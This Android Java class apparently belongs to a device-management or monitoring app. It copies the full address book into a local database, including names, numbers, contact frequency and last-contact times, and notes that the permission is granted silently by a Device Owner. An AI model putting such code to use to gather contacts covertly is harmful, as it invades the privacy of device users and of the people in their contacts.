package com.riad.rrlkr.metadata;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Collects the device address book (contact name + phone number + metadata)
 * into the local {@code contacts} table. Requires READ_CONTACTS, which the
 * Device Owner grants silently on enrolled devices. One row is stored per
 * phone number; duplicates are ignored via the UNIQUE(name, number) constraint.
 */
public class ContactsCollector {

    private final Context context;
    private final MetadataDatabase db;

    public ContactsCollector(Context context) {
        this.context = context;
        this.db = MetadataDatabase.getInstance(context);
    }

    public void collect() {
        String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            .format(new Date());
        try (Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {
            if (cursor == null) return;
            int colName = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int colNumber = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            int colNormalized = cursor.getColumnIndex(
                ContactsContract.CommonDataKinds.Phone.NORMALIZED_NUMBER);
            int colType = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE);
            int colTimesContacted = cursor.getColumnIndex(
                ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED);
            int colLastContacted = cursor.getColumnIndex(
                ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED);
            int colAccountType = cursor.getColumnIndex(
                ContactsContract.CommonDataKinds.Phone.ACCOUNT_TYPE_AND_DATA_SET);

            while (cursor.moveToNext()) {
                String name = colName >= 0 ? cursor.getString(colName) : "";
                String number = colNumber >= 0 ? cursor.getString(colNumber) : "";
                if (number == null || number.trim().isEmpty()) continue;
                String normalized = colNormalized >= 0 ? cursor.getString(colNormalized) : "";
                String type = colType >= 0 ? phoneType(cursor.getInt(colType)) : "OTHER";
                String timesContacted = colTimesContacted >= 0
                    ? String.valueOf(cursor.getInt(colTimesContacted)) : "0";
                String lastContacted = colLastContacted >= 0
                    ? String.valueOf(cursor.getLong(colLastContacted)) : "0";
                String accountType = colAccountType >= 0 ? cursor.getString(colAccountType) : "";

                db.insertContact(name != null ? name : "", number.trim(),
                    normalized != null ? normalized : "", type,
                    timesContacted, lastContacted,
                    accountType != null ? accountType : "", timestamp);
            }
        } catch (SecurityException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String phoneType(int type) {
        switch (type) {
            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: return "HOME";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE: return "MOBILE";
            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: return "WORK";
            case ContactsContract.CommonDataKinds.Phone.TYPE_MAIN: return "MAIN";
            case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER: return "OTHER";
            default: return "OTHER";
        }
    }
}
